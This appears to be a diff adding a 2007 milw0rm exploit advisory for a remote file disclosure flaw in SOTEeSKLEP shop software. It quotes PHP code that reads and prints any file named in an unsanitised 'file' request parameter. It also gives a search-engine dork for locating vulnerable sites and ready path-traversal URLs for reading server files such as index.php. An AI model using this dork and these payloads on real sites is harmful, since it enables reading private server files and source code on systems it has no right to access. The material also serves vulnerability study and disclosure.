@@ -1,0 +1,31 @@
+SOTEeSKLEP Remote File Disclosure Vulnerability
+
+Script : SOTEeSKLEP
+
+Versions: 3.1RC8, 3.5RC1, 3.5RC4, 3.5RC9, and i think other.
+
+Site : http://www.sote.pl
+
+Bug:
+
+...
+if (! empty($_REQUEST["file"])) { $file=$_REQUEST['file']; }
+...
+$file_path="$DOCUMENT_ROOT/themes/_$config->lang/_html_files/$file";
+if (file_exists($file_path)) { $fd=fopen($file_path,"r");
+$data=fread($fd,filesize($file_path));
+print $data;
+fclose($fd);
+}
+...
+
+Dork: inurl:"/go/_files/?file="
+
+Examples:
+http://???/go/_files/?file=./.././.././.././
+http://???/go/_files/?file=./.././.././.././go/_files/index.php
+
+Discovered by dun
+2007.08.11
+
+# milw0rm.com [2007-08-13]
